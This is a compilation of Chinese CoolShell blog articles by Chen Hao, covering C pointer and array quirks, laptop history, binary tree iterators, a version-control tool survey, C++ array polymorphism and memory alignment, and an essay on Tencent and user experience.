考虑下面两种编译代码的方式 ：* cc -Wall a.c   * cc -Wall -O a.c前一种是不会编译出a未初化的警告信息的，而只有在-O的情况下，才会有未初始化的警告信息。这点就是为什么我们在makefile里的CFLAGS上总是需要- Wall和 -O。最后，我们再来看一个指针问题，你看下面的代码：假如我们的a的地址是：0Xbfe2e100, 而且是32位机，那么这个程序会输出什么？* 第一条printf语句应该没有问题，就是 bfe2e100   * 第二条printf语句你可能会以为是bfe2e101。那就错了，a+1，编译器会编译成 a+ 1*sizeof(int)，int在32位下是4字节，所以是加4，也就是bfe2e104   * 第三条printf语句可能是你最头疼的，我们怎么知道a的地址？我不知道吗？可不就是bfe2e100。那岂不成了a==&a啦？这怎么可能？自己存自己的？也许很多人会觉得指针和数组是一回事，那么你就错了。如果是 int *a，那么没有问题，因为a是指针，所以 &a 是指针的地址，a 和 &a不一样。但是这是数组啊a[]，所以&a其实是被编译成了 &a[0]。   * 第四条printf语句就很自然了，就是bfe2e104。还是不对，因为是&a是数组，被看成int(*)[5]，所以sizeof(a)是5，也就是5*sizeof(int)，也就是bfe2e114。
看过这么多，你可能会觉得C语言设计得真扯淡啊。不过我要告诉下面几点Dennis当初设计C语言的初衷：**1）相信程序员，不阻止程序员做他们想做的事。****2）保持语言的简洁，以及概念上的简单。****3）保证性能，就算牺牲移植性。**今天很多语言进化得很高级了，语法也越来越复杂和强大，但是C语言依然光芒四射，Dennis离世了，但是C语言的这些设计思路将永远不朽。**（请勿用于商业用途，转载时请注明作者和出处）**# 笔记本电脑的发展史作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这是一段比较有趣的历史，让我们回顾一下笔记本电脑的整个历史吧。可能叫便携式电脑比较好一点。**1970 – 1981 第一个便携式的电脑概念**上世纪70年代，Alan Kay 在 Xerox PARC开始有了便携式个人电脑的想法。到了1981年， Osborne 1问世，其由Adam Osborne创造。如下图。Osborne 1 有一个5英寸的屏幕，还有一个可选的电池，两个5 ¼” 软驱，一个 modem 接口，还有一个键盘。当时的价格是$1,800（包括一块电池）。
!osborne1### 1981 – 1984 : Gavilan 和 IBM没有多久Gavilan Mobile Computer公司也进入了这个行业。其第一个便携式电脑的原型和今天的笔记本电脑非常相似，而且只有4公斤重并且配备了一个可以运行9个小时的镍镉电池。无论是从性能还是设计上来说，在1983年，这已经是非常超前的。而且这是 Galvin 第一次向市场引入了“移动PC”的术语。!gavilan-mobile-computerOsborne 1的出现后， 微软公司的Kazuhiko Nishi 开始了一个便携式电脑的原型，其采用了LCD显示屏，重量2 kilos，叫做“Radio Shack TRS-80 Model 100 Mobile Computer”，有一个 modem，还有一个无线电通讯的程序，以及一个文本编辑器和一个由微软开发的小程序。总的来说，这更像是一个无线装置。（如下图）!radio-shack-trs-80-model-100-mobile-computer随着我们的“Radio Shack”让我们的便携式电脑看起来更像是笔记本电脑，IBM也开发进入这个市场，其于1984年开发了Portable PC 5155。但是，这个便携式电脑犯了一个可怕的错误，那就是其“便携”的重量有13.6公斤，而且有一个9英寸的显示器，价格在$ 4000。而且，你还得随时插在电脑插座上，因为它根本没有电池。所以，5155 充其量只不过是一个“可以容易搬动的台式电脑”。不过非常感谢IBM的是，他们只用了1年的时间就终止了这个畸形的产物。
!ibm-portable-pc-5155### 1984 – 1988: Compaq在接下来的几年，笔记本电脑几乎没有什么发展。不过Compaq 公司在1988 的时候开发了一台便携式电脑Compaq SLT 286，有一个VGA的显示器，1.44英寸的软戏和一颗286的CPU，只是重量有6公斤。!compaq-slt-286###### 1989 – 1993: NEC，Zenith的MinisPORT 以及 第一代的MacintoshNEC 公司改变了便携式电脑重量太重的局面，他的 NEC UltraLite model— 第一个有完整功能的基于MS-DOS的便携式PC机只有4.4 磅（2公斤左右）。而其接下来具有革命性的发展是在90年代，但其开始1989年，由 Zenith Data Systems 公司生产的 Minisport，其带 640K的RAM，1.44英寸的软驱，一个2400波特率的Modem以及一个20MB ESDI 硬盘。虽然其只有一个彩色的LCD显示器，但是，也足够不错了。从此开始了便携电脑的新纪元。!zeniths-minisport接下来，我们来看一下，苹果公司的第一代Macintosh 便携机，重达8公斤，但是其有 9.8英寸的最大分辨率有 640 x 400像素的显示器。
!macportable到了1993年，我们开始有了 256色的显示器，其代表产品是PowerBook 165c。然后，我们开始进入今天，百万像素的真彩色显示器，更好和更轻的的笔记本电脑，更为灵活的设计，更好的性期，并开始有了多媒体包括CD- ROM。然后，真正没有让笔记本电脑流行的是，笔记本电脑的性价比，价格太贵了，像ThinkPad和MacBook也是在那时出现的，但是没有多少人能真正地买得起。!powerbook-165c**1996 – 2003 : Panasonic 的ToughBooks 和Intel 处理器**1996年Panasonic 公司引入了新一代的笔记本电脑——Toughbook (CF-25)，70 cm高，可以抵抗灰尘和水气，非常明显，松下公司想改变便携式电脑的观念，感觉上这个电脑更像是一个军用的。就算是使用枪击过的电脑，电脑也能正常工作。!panasonic-toughbook-cf-25-bullets以后，直到2003年，直到Intel开发出了不可思异地低能耗的 Pentium M 处理器，其在整个笔记本电脑的发展上写下了重重的一笔，而且价格上开始了巨大的松动，于是笔记本电脑也开始进了一平常百姓家里。
**今天和未来**让我们来看看今天的电脑吧。今天，无线连接，蓝牙，Wi-Fi, DVD 光驱, 高级显卡，宽屏，超薄，口袋电脑，……Apple Macbook Air!macbook-airAsus EEE PC S101!asus-eee-pc-s101我们再来看看未来的电脑，下图是Sony VAIO Zoom，一台使用全息技术的笔记本电脑。可能未来还不止如此，让我们一起期望……!sony-zoom文章：来源# 二叉树迭代器算法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢**@文艺复兴记 **（todd） 投递此文）**二叉树(Binary Tree)的前序、中序和后续遍历是算法和数据结构中的基本问题，基于递归的二叉树遍历算法更是递归的经典应用。假设二叉树结点定义如下：中序递归遍历算法：前序和后序遍历算法类似。但是，仅有遍历算法是不够的，在许多应用中，我们还需要对遍历本身进行抽象。假如有一个求和的函数sum，我们希望它能应用于链表，数组，二叉树等等不同的数据结构。这时，我们可以抽象出迭代器(Iterator)的概念，通过 **迭代器把算法和数据结构解耦了** ，使得通用算法能应用于不同类型的数据结构。我们可以把sum函数定义为：
int sum(Iterator it)链表作为一种线性结构，它的迭代器实现非常简单和直观，而二叉树的迭代器实现则不那么容易，我们不能直接将递归遍历转换为迭代器。究其原因，这是因为二叉树递归遍历过程是编译器在调用栈上自动进行的，程序员对这个过程缺乏足够的控制。既然如此，那么我们如果可以自己来控制整个调用栈的进栈和出栈不是就达到控制的目的了吗？我们先来看看二叉树遍历的非递归算法：// C++     void inorder_traverse_nonrecursive(Node *node) {     Stack stack;     do {     // node代表当前准备处理的子树，层层向下把左孩子压栈，对应递归算法的左子树递归     while (NULL != node) {     stack.push(node);     node = node->left;     }     do {     Node *top = stack.top();     stack.pop(); //弹出栈顶，对应递归算法的函数返回     do_something(top);     if (NULL != top->right) {     node = top->right; //将当前子树置为刚刚遍历过的结点的右孩子，对应递归算法的右子树递归     break;     }     }     while (!stack.empty());     }     while (!stack.empty());     }
通过基于栈的非递归算法我们获得了对于遍历过程的控制，下面我们考虑如何将其封装为迭代器呢？ 这里关键在于理解遍历的过程是由栈的状态来表示的，所以显然迭代器内部应该包含一个栈结构，每次迭代的过程就是对栈的操作。假设迭代器的接口为：下面是一个二叉树中序遍历迭代器的实现：下面我们再来考察一下这个迭代器实现的时间和空间复杂度。很显然，由于栈中最多需要保存所有的结点，所以其空间复杂度是O(n)的。那么时间复杂度呢？一次next()调用也最多会进行n次栈操作，而整个遍历过程需要调用n次next()，那么是不是整个迭代器的时间复杂度就是O(n^2)呢？答案是否定的！因为每个结点只会进栈和出栈一次，所以整个迭代过程的时间复杂度依然为O(n)。其实，这和递归遍历的时空复杂度完全一样。除了上面显式利用栈控制代码执行顺序外，在支持yield语义的语言（C#, Python等)中，还有更为直接的做法。下面基于yield的二叉树中序遍历的Python实现：// Python     def inorder(t):     if t:     for x in inorder(t.left):     yield x     yield t.label     for x in inorder(t.right):     yield x
yield与return区别的一种通俗解释是yield返回时系统会保留函数调用的状态，下次该函数被调用时会接着从上次的执行点继续执行，这是一种与栈语义所完全不同的流程控制语义。我们知道Python的解释器是C写的，但是C并不支持yield语义，那么解释器是如何做到对yield的支持的呢？ 有了上面把递归遍历变换为迭代遍历的经验，相信你已经猜到Python解释器一定是对yield代码进行了某种变换。如果你已经能够实现递归变非递归，不妨尝试一下能否写一段编译程序将yield代码变换为非yield代码。# Martin Fowler 在 ThoughtWorks 内部关于版本控制工具的调查作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn_文章来源 martinfowler.com_从2010年2月23日至3月3日，Martin Fowler 在 ThoughtWorks 内部通过开发人员邮件列表进行了一个关于版本控制工具的小调查，共收到99个回复。下面是调查选项定义和调查结果：* 非常好 （如果不是最好也非常接近了）   * 还行 （不是最好，但是我还是愿意使用）   * 问题多多 （我可能会因此强烈建议我的团队使用其他同类工具）   * 危险 （非常糟糕的工具，我认为 ThoughtWorks 不应该使用它）   * 不知道 （我还没有使用过此工具）   * 回复数 （对此工具的回复总数，包括“不知道”选项）   * 好评率 （(“非常好”+“还行”)/回复数）
名称 | 非常好 | 还行 | 问题多多 | 危险 | 不知道 | 回复数 | 好评率   ---|---|---|---|---|---|---|---   **Subversion** | 20 | 72 | 6 | 1 | 0 | 99 | 93%   **git** | 65 | 19 | 1 | 0 | 14 | 85 | 99%   **Mercurial** | 33 | 27 | 2 | 0 | 36 | 62 | 97%   **ClearCase** | 0 | 3 | 14 | 41 | 41 | 58 | 5%   **TFS** | 0 | 0 | 32 | 22 | 44 | 54 | 0%   **CVS** | 0 | 14 | 59 | 11 | 15 | 84 | 17%   **Bazaar** | 1 | 13 | 3 | 0 | 80 | 17 | 82%   **Perforce** | 1 | 26 | 16 | 1 | 54 | 44 | 61%   **VSS** | 1 | 1 | 11 | 64 | 22 | 77 | 3%Martin Fowler 补充道：
* Subversion，git，和 Mercurial 都得到了较高的好评率，git 得分最高。   * 大部分人认为 VSS 很危险，不过也有一两个人认为它还不错。   * 大家都不太喜欢 TFS 和 ClearCase，并认为 ClearCase 更为危险。   * 我们不用太拘泥于具体数据，特别是对于那些不好的工具的差评都无太大区别，而对于那些优秀的工具的好评却很有一些不同。Martin Fowler 反复强调这只是一个公司内部的调查，并无误导市场的意思，大家如果感兴趣的话可以点击 __文章来源__ 阅读原文，以及另一篇关于版本控制的文章 _VersionControlTools_ 。# C++ 程序员自信心曲线图作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn学习C++很长时间了，也看过很多程序员学习C++的历程。总体来说，C++是一个“双刃剑”式的语言，只有那些熟悉他的人才能把C++这门语言用好。Linus曾说过：“ **C++是一门很恐怖的语言，而比它更恐怖的是很多不合格的程序员在使用着它**”。是的，C++并不是一门速成的语言，其是一门需要长时间磨练和学习的语言，那些说自己熟悉C++语言的程序只能算是轻浮的。详见“21天教你学会C++ ”。
下面是一个C++程序员在学习过程序中的一个自信心曲线图：程序员在一开始学习C++的时候，用C++的语法写C觉得很牛，也会觉得自己很快掌握了C++语言，对一切都充满了信心。他们告诉你他们懂C++，其它他们错误，但我们不能说他们在撒谎，因为人总是不知道自己不知道什么。此后，当他们在C++的学习历程中，发现了很多很多稀奇古怪的东西，还有很多相当底层和复杂的东西，他们的将会变得很受挫，很沮丧，还始变得怀疑起，自信心开始下降，甚至有时候他们靠人品来编程。只到有一天，开始开窃，觉得C++的世界不能乱来，需要一定的规则，一定的方法，于是通过大量的错误不停地总结和反省，最终自信心又会被建立起来，经历多年的历练后，才能恢复自信。对于大多数的自称自己熟悉C++的程序员来说，基本上来说他们都是用C++的语法来写C。# “C++的数组不支持多态”？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn先是在微博上看到了个微博和云风的评论，然后我回了“楼主对C的内存管理不了解”。后来引发了很多人的讨论，大量的人又借机来黑C++，比如：> //@Baidu-ThursdayWang:这不就c++弱爆了的地方吗，需要记忆太多东西 > > > //@编程浪子张发财:这个跟C关系真不大。不过我得验证一下，感觉真的不应该是这样的。如果基类的析构这种情况不能 > 调用，就太弱了。 > > > //@程序元：现在看来，当初由于毅力不够而没有深入纠缠c++语言特性的各种犄角旮旯的坑爹细枝末节，实是幸事。为现在还沉浸于这些诡异特性并乐此不疲的同志们感到忧伤。
然后，也出现了一些乱七八糟的理解：> //@BA5BO: > 数组是基于拷贝的，而多态是基于指针的，派生类赋值给基类数组只是拷贝复制了一个基类新对象，当然不需要派生类析构函数 > > > //@编程浪子张发财:我突然理解是怎么回事了，这种情况下数组中各元素都是等长结构体，类型必须一致，的确没法多态。这跟C#和java不同。后两者对于引用类型存放的是对象指针。等等，看来我必需要写一篇博客以正视听了。因为没有看到上下文，我就猜测讨论的可能会是下面这两种情况之一：1) 一个Base*[]的指针数组中，存放了一堆派生类的指针，这样，你delete [] pBase; 只是把指针数组给删除了，并没有删除指针所指向的对象。这个是最基础的C的问题。你先得for这个指针数组，把数据里的对象都delete掉，然后再删除数组。很明显，这和C++没有什么关系。2）第二种可能是：Base *pBase = new Derived[n] 这样的情况。这种情况下，delete[] pBase 明显不会调用虚析构函数（当然，这并不一定，我后面会说） ，这就是上面云风回的微博。对此，我觉得如果是这个样子，这个程序员 **完全没有搞懂C语言中的指针和数组是怎么一回事** ，也没有搞清楚， 什么是对象，什么是对象的指针和引用，这完全就是C语言没有学好。
后来，在看到了 @GeniusVczh 的原文 《如何设计一门语言（一）——什么是坑(a)》最后时，才知道了说的是第二种情况。也就是下面的这个示例（我加了虚的析构函数这样方便编译）：Base* pBase = new Derived[10];     delete[] pBase;#### C语言补课我先不说这段C++的程序在什么情况下能正确调用派生类的析构函数，我还是先来说说C语言，这样我在后面说这段代码时你就明白了。对于上面的：`Base* pBase = new Derived[10];`这个语言和下面的有什么不同吗？Derived d[10];Base* pBase = d;一个是堆内存动态分配，一个是栈内存静态分配。只是内存的位置和类型不一样，在语法和使用上没有什么不一样的。（如果你把Base 和 Derived想成struct，把new想成malloc() ，你还觉得这和C++有什么关系吗？）**那么，你觉得pBase这个指针是指向对象的，是对象的引用，还是指向一个数组的，是数组的引用？**于是乎，你可以想像一下下面的场景：int *pInt; char* pChar;pInt = (int*)malloc(10*sizeof(int));
pChar = (char*)pInt;**对上面的pInt和pChar指针来说，pInt[3]和pChar[3]所指向的内容是否一样呢？当然不一样，因为int是4个字节，char是1个字节，步长不一样，所以当然不一样。****那么再回到那个把Derived[]数组的指针转成Base类型的指针pBase，那么pBase[3]是否会指向正确的Derrived[3]呢？**我们来看个纯C语言的例程，下面有两个结构体，就像继承一样，我还别有用心地加了一个void *vptr，好像虚函数表一样：注意：我用的是G++编译的，在64bits平台上编译的，其中的sizeof(void*)的值是8。我们看一下栈上内存分配：struct A *pa1 = (struct A*)(b);用gdb我们可以看到下面的情况：(pa1[1]的成员的值完全乱掉了)我们再来看一下堆上的情况：（我们动态了struct B [2]，然后转成struct A *，然后对其成员操作）struct A *pa = (struct A*)malloc(2*sizeof(struct B));     struct B *pb = (struct B*)pa；
pa[0].vptr = (void*) 0x01;     pa[1].vptr = (void*) 0x02;pa[0].i = 100;     pa[1].i = 200;用gdb来查看一下变量，我们可以看到下面的情况：（pa没问题，但是pb[1]的内存乱掉了）可见，这完全就是C语言里乱转型造成了内存的混乱，这和C++一点关系都没有。而且，C++的任何一本书都说过，父类对象和子类对象的转型会带来严重的内存问题。但是，如果在64bits平台下，如果把我们的structB改一下，改成如下（把struct B中的int j给注释掉）：struct B{     void *vptr;     int i;     char c;     //int j; <---注释掉int j     }b[2] ={     {(void*)0x01, 100, 'a'},     {(void*)0x02, 200, 'A'}     };你就会发现，上面的内存混乱的问题都没有了，因为struct A和struct B的size是一样的：(gdb) p sizeof(struct A)     $6 = 16     (gdb) p sizeof(struct B)     $7 = 16
注：如果不注释int j，那么sizeof(struct B)的值是24。这就是C语言中的内存对齐，内存对齐的原因就是为了更快的存取内存（详见《深入理解C语言》）如果内存对齐了，而且struct A中的成员的顺序在struct B中是一样的而且在最前面话，那么就没有问题。#### 再来看C++的程序如果你看过我5年前写的《 **C++虚函数表解析** 》以及《 **C++内存对象布局上篇、下篇**》，你就知道C++的标准会把虚函数表的指针放在类实例的最前面，你也就知道为什么我别有用心地在struct A和struct B前加了一个 void *vptr。C++之所以要加在最前面就是为了转型后，不会找不到虚表了。好了，到这里，我们再来看C++，看下面的代码：delete [] pb;return 0;     }**上面的代码可以正确执行，包括调用子类的虚函数！因为内存对齐了** 。在我的64bits的CentOS上——sizeof(B):16 ，sizeof(D):16**但是，如果你在class D中再加一个int成员的问题，这个程序就Segmentation fault了** 。因为—— sizeof(B):16 ，sizeof(D):24。pb[1]的虚表找到了一个错误的内存上，内存乱掉了。
再注：我在Visual Studio 2010上做了一下测试，对于 struct 来说，其表现和gcc的是一样的，但对于class的代码来说，其可以“正确调用到虚函数”无论父类和子类有没有一样的size。然而，在C++的标准中，下面这样的用法是undefined! 你可以看看StackOverflow上的相关问题讨论：《[Why is it undefined behavior to delete[] an array of derived objects via a base pointer?](http://stackoverflow.com/questions/6171814/why-is-it-undefined- behavior-to-delete-an-array-of-derived-objects-via-a-base "Why is it undefined behavior to delete\[\] an array of derived objects via a base pointer?")》（同样，你也可以看看《More Effective C++》中的条款三）
Base* pBase = new Derived[10];delete[] pBase;所以，微软C++编程译器define这个事让我非常不解，对微软的C++编译器再度失望，看似默默地把其编译对了很漂亮，实则误导了好多人把这种undefined的东西当成defined来用，还赞扬做得好，真是令人无语。 **（**就像微博上的这个贴一样，说VC多么牛，还说这是OO的特性。我勒个去！ **）**现在，你终于知道Base* pBase = new Derived[10];这个问题是C语言的转型的问题，你也应该知道用于数组的指针是怎么回事了吧？ **这是一个很奇葩的代码！请你不要像那些人一样在微博上和这里的评论里高呼并和我理论到：“微软的C++编译器支持这个事！”。**最后，我越来越发现， **很多说C++难用的人，其实是不懂C语言** 。（全文完）# 介绍作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn陈皓以前的blog在CSDN——http://blog.csdn.net/haoel，08、09年的时候，CSDN的博客系统很不稳定，另外，正好有一台N年前的托管的服务器，所以，就申请了域名，陈皓（左耳朵耗子）建立自己的Blog。 本站为什么叫“酷壳”，绝属误打误撞。原来的域名是：CoCre.com，原意是Corporation+Creative两个单词的缩写，是陈皓一大学同学申请的，后来他出国了，所以，我就把这个域名用来做成我的Blog了，把CoCre按发音读成“酷壳”和“酷客”，但感觉不好记，于是注册了CoolShell.cn，感觉这个可能更好记一点。要说“酷壳”有什么意思，在这里我可以说，完全没有，就是一个名字罢了。 这是一个完全依靠个人建立的技术性BLOG。是一个分享技术见闻，知识，趋势的网站，这是我个人建立的网站，如果你喜欢其中的文章呢，欢迎给我们留言，如果不想留言呢，你也可以通过打分来鼓励我们分享和写作。当然，我们最欢迎的是你的加入，欢迎你和我们一起写作。欢迎大家注册并加入我们一起来分享编程和技术方面的见闻和心得。文章可以是原创，翻译、杂谈，灌水，只要是和技术和编程相关就可以。 陈皓以前的博客在CSDN（http://blog.csdn.net/haoel），目前已不更新，博客全面转到酷壳：http://CoolShell.cn，陈皓基本不会在微信公众号上写文章。 陈皓，左耳朵耗子有20年软件开发相关工作经验，10年以上项目和团队管理经验。擅长底层技术架构，团队建设，软件工程，软件研发咨询，以及全球软件团队协作管理。对高性能，高可用性，分布式，高并发，以及大规模数据处理系统有一些经验和心得。喜欢关注底层技术平台和互联网行业应用。技术擅长C/C++/Java和Unix/Linux/Windows。曾于Amazon中国任研发经理，负责电子商务全球化业务（全球开店）和全球库存预测系统的研发。曾在阿里巴巴北京研发中心、商家业务部曾任资深专家一职，负责电商云平台、开放平台，云监控和电商多媒体平台。曾在阿里巴巴核心系统专家组从事阿里核心系统和阿里云ECS相关的虚拟化平台的开发工作。现在创业中，MegaEase创始人，致力于为企业的高并发高可用架构提供一整套的技术解决方案和产品
# 腾讯，竞争力 和 用户体验作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn自从那篇rant了一堆公司都的文章发布来，得到了大家的关注，有些朋友让我写一下腾讯，在我的微博上（@左耳朵耗子）还有位腾讯的朋友让我也评价一下腾讯。本来不想写的，觉得腾讯没啥好说的，但是因为下面的几个原因，让我有点坐不住了：1. 这两天知乎上的一个“腾讯的核心竞争力”的贴子在微博上被很多人所推崇。   2. 还有一个网友发邮件给我说让我别rant了，宁可C2C也比rant有意义。   3. 我周末的时候去豆瓣和他们交流了一些关于产品和用户体验方面的话题。   4. 还看到了Jeff Bezos的访谈文章《贝佐斯：亚马逊是科技界唯一一家低利润公司》于是就有了这篇文章，但不想再rant了，我希望这篇文章更有价值一些，但是我喜欢的调侃的风格依然，因为这是我觉得能让文章有趣味的方式。目录* 腾讯的“价值”   * “腾讯的核心竞争力”一文   * 腾讯的软肋   * 真正的用户体验#### 腾讯的“价值”首先我想说说腾讯的价值。根据我那篇 rant 的文章来说，我觉得人要活得有价值，事业也要做得有价值。我不太待见那些没有价值的东西。所以，我在那篇文章里让大家都思考了一个问题，我们做这个事的价值在哪里？所以，要评论腾讯，就得想想他的价值。众所周知，腾讯的起家是通过IM软件QQ，当然，他有段时间几乎快不行了。不过挺过来了，造就了这么一个帝国。所以，腾讯的价值应该是即时通讯，让大家的沟通变得更顺畅，这点腾讯的确做得非常强大，视频，音频，涂鸦，抓屏，表情，Q币，共享，群聊，新闻，弹窗，离线文件，远程协助…… 的确做得非常地体贴用户。除了扫描硬盘文件有点那个。
但是，最近的腾讯变了（当然有人说他也没有变，QQ本来就是抄来的），有什么就抄什么，没有创意，山寨大王，成了腾讯的代名词。马云也说过：“现在腾讯拍拍网最大的问题就是没有创新，所有的东西都是抄来的”。网上还有很多，什么“一直在抄袭，从未超越过”或是“一直在山寨，从没反省过”等等的话，还有“自从有了XXX，腾讯就出了XXX”的文体。**但是，你们都错了，包括马云，我不同意你们，我觉得这正是腾讯的价值所在** 。昨天有个网友写邮件给我说，整天rant也没啥意思吧，还不如真的做点C2C吧。他的想法是先把一些基本的东西如评论，发贴，头像，登录什么的都做好，然后国外出什么就抄什么，抄的会飞快。我给他回信说，你抄得过腾讯吗？他无语了。你看，一个有C2C想法的人就这样被放弃了其想法。所以，我觉得， **腾讯这样大规模的抄袭和山寨，对整个社会的价值就是—— 会让很多很多的创业团队放弃Copy，甚至让他们要放弃那些容易被复制的“业务型的项目”，而逼着他们去努力思考，如何才不能被腾讯复制，如何才能有自己的核心价值**。而所有的骂名都被腾讯所承当，腾讯把住了所有的茅坑，让你不得不去做最有价值的东西，这是一种什么样的精神啊？！对于那些整天都在骂腾讯的人来说，你们好好地去面壁反思吧！
#### “腾讯的核心竞争力”一文顶在这篇文章最上面的最佳答案是腾讯无线国际业务产品总监Andy Pan的答案，在微博上也广受推崇。不知道为什么，我总是有一些和大家不一样的想法，看来我是一个有相当逆反心理的愤青。没做出什么东西来，话还挺多，我都有点烦自己了，你也多多原谅我。Andy Pan的答案中，说了两点核心竞争力，第一个是腾讯的IM平台，还用了Windows来做比较，很明显，这个前微软件的产品总监并不知道什么是平台，关于平台，Steve Y的这篇平台论说得很清楚了，建议Andy同学学习一下。Windows之所以是个平台的原因是因为Windows没有什么都做，而是开放了很多很多的API和SDK让第三方的产商去做，而腾讯并没有开放IM的API，不但搞定了珊瑚虫，而且什么事情都要自己做，这根本不是平台，平台是要去开放的，是要去为业界创造生态环境的，而腾讯的做法更像是封闭的垄断。当Andy Pan说起Amazon收购Zappos的时候，他忘记了Amazon的云平台上还养了一个巨大的竞争对手Target（最近分手了），还养了十年。因为，Bezos觉得有个竞争对手和自己进行良性的竞争对自己是有好处的。
Andy还说做为一个IM细分用户的领域是有必要的，没错，完全赞同。不过，实在看不出来对领域的细分，更多的是对领域的扩张。新闻门户，搜搜，拍拍，百科，Q吧，炫风，炫舞，三国，英雄杀，浏览器，输入法，对战平台，电台，影音，图书，阅读，3366，QQTalk…… 一点都看不出来的是对IM的细分。你信吗？第二个Andy说的核心竞争力是员工加班。加班到深夜也成了核心竞争力，看来是实在找不到核心竞争力了。好吧，我觉得这句话可以说得更好一些，再怎么也应该说成是企业文化，或是企业文化催人奋进，每个人都有主人翁的精神，而不是工作负荷大嘛。你看，我都能说的这么漂亮啊，我才是像高管的样子哦，吼吼。对我来说，加班文化是差团队的表现，要么就是管理不行，让大家都加班，要么就是自己不行（反正肯定有问题，我在多些时间能少些代码里论述过了）。当然，我知道了，腾讯的战线拉得很长，什么都要做，当然会那么累了，要学会做精不要做多嘛。作为一位高管，应该要知道，重要的不是你有多努力，你花了多少时间，而是你有没有去思考，有没有去创造价值。 **腾讯难道不觉得，不断地创新去颠覆传统才是互联网行业的核心竞争力吗** 。我觉得腾讯那所谓的核心竞争力是用户数量大，大在关系链上，像我这样几本不用QQ的人有时候都会被朋友和同学逼着去用QQ收个文件照片或是远程协助个什么。QQ这个聊天工具做得非常不错，这点我是要赞一下的。所以，这才让用户聚集起来，没有了这个，不知道腾讯会怎么样。
#### 腾讯的软肋Andy Pan有一点说的是对的，就是腾讯和微软很像，不过像的不是平台，而是运营模式——那就是永远跳不出自己的模式。微软不管做什么，都必需誓死捍卫其Windows平台，连那么有创造力的体感硬件Knect也只能用在微软的产品和平台上，更不用说hotmail，Bing和Sharepoint了，如果能开放一些用点别的技术，我相信微软在互联网界可能还是很强大的。腾讯也逃不出“腾讯的模式”——那就是 **大量的低端业务和低端内容** 。我不确定腾讯是不是像微软那样誓死捍卫其低端业务和内容的。但是QQ的确驱逐了很多高质量的用户，因为QQ上的不成熟的小孩太多了，交友，网恋，甚至欺骗和色情在那里泛滥，造成劣币驱逐良币。另外，QQ这个名词起得很不好，因为正常点的成年人都不会去Q（装可爱），所QQ好像也就成了未成年人的代名词。而似乎有自我价值诉求的人都不会用QQ，在正式场合比如自己的应聘简历上留一个QQ邮箱还是有点掉价的。可见QQ的这个品牌形象很低端。腾讯的很多产品都走的都是这个路线。不可否认，这和中国网民的群体素质有关系。但我以为， **作为那么大的公司，应该担负起培养或引导网民素质，开启民智，引人向上的角色，而不是将就于低端的大众用户** 。
另外，还值得一提的是近来关于通过QQ抓人的新闻很多，所以，大家都知道的为什么更多的用户去用gtalk了。不过有一点应该是真的，那就是通过QQ监控聊天用户的体验，应该是很不错的。看到这里，你一定会对我抱怨说：“我擦，你这篇还照旧是一篇rant，fuck你一万遍”。别骂了，你没有看我已经赶快起了一个新段落来说点我觉得有点价值的东西。#### 真正的用户体验说起用户的体验，这是一个可能比较大的，也可能比较具体的话题（以前本站有一篇关于UX比喻的文章）。关于用户体验来说，很多人都以为是对UI的一个加强，也就是说把UI的操作做得更好。所以，大家都在UI上花大力气做UX。这样的认识并不错，QQ做得也是非常好的，看看WebQQ，真是非常地强大。不过，我想说， **如果你认为用户的体验在UI上，那么你只看到了用户体验的冰山一角，用户的体验远远不只这个** 。“ **任何表面上的东西都是肤浅的** ”——这是写Effective C++的Scott Meyers说的。你看——Reddit，Twitter，StackOverflow， 还有国内的豆瓣，界面做的真的不怎么的，Reddit的界面ugly到了就像是一个没有完成的原型网站一样！但是为什么人家的用户人气那么旺，为什么呢？
这就是我想说的比UI更高层次的用户体验了—— **关注用户的真正的体验** 。我先举个例子——> 大家知道Amazon注册了很多个容易让人打错的域名吗？我这里有一个不完整的列表：Amamzon.com， > Amaxon.com，Amazong.com，Amozon.com，Amazonc.com，Amazone.com，Amazn.com（翻墙），namazon.com…… > 为的都是用户体验。（注：你要是用拼音也可以，如：yamaxun.com）这是一个很小的例子，旨在说明用户体验不单单是UI的事。下面正式阐述真正的用户体验（这些东西我在前面那篇rant里提过了，这里说得更细一点）——* **注重社区的质量** 。很多论坛和网站的兴起都是因为一开始有高质量的文章和素质高的人，然而，人气一足，三教九流的人都来了，于是劣币逐良币，那些素质高的人就只能离开了。所以，任何把高质量和低质量的东西放在一起的社区相当的破坏整体用户体验。尤其是那些对质量有诉求的人。为了避免劣币逐良币，大家要学习一下豆瓣，StackOverflow，没有什么热文版，就算有，也要精心地控制内容的质量。 **你要知道，人们来这里是因为被这个社区有价值的东西吸引来的** 。就像是去StackOverflow或Quora一样，可以得到很靠谱的答案，可以和很牛的人在一起交流，这是社区的价值。所以，像StackOverflow或Quora这样的网站，一些质量不高的答案在那里就会被投反对票，其会影响你的reputation。看看Amazon.com上的书评，IMDB上的影评，非常专业，还有打分，高质量的东西自然就浮出来了，低质量的东西自然就下降了。 **小心维护社区的质量必然会给用户有更好的体验** 。（不知道大家有没有参加过豆瓣的小组活动，我有一个朋友参加过一次关于绘画的活动，说是质量相当高）
* **注重社区的权威** 。像豆瓣或是Stackoverflow上都有评分。你怎么能让你的评分有权威性呢？你知道，在中国这块土地上有大量的五毛和水军，他们随时都可以开动，3Q大战的时候大家都见识过了，对于这些牛皮癣怎么办呢？在Stackoverflow上，你会发现，你没有15点reputation，你没有资格vote什么，你为了要能去vote什么，你先得贡献些什么，对于不懂技术的五毛和水军们完全搞不定这些东西了（当然，你可以去建一个问题，但是要小心被down vote）。对于豆瓣来说，豆瓣的每个用户都有个权威值，这个值通过用户的在线时间，发贴数量，访问次数，有没有高质量的文章，有没有参加社区活动，等等等因素，得出一个权威值。刚注册的用户权威值为0，如果有了一些负面的东西还有可能是负数，有些被社区所推崇的牛人级的用户的权威可能高达几千几万。这样，当水军和五毛们对一本书或是一个电影投票的时候，就算是数量大，但基本上没有什么作用。这就是为什么豆瓣里有的电影有70%的人投了三分或四分，但那个电影还是在快5分的样子。这就是为了维护社区的权威和质量的体现。淘宝的好评差评也是一样，但是如果可以被水军去冲的话，那就很没有意思了。看看大众点评网里的那些评论，很多都完全失去了权威。因为他们没有vote的机制。
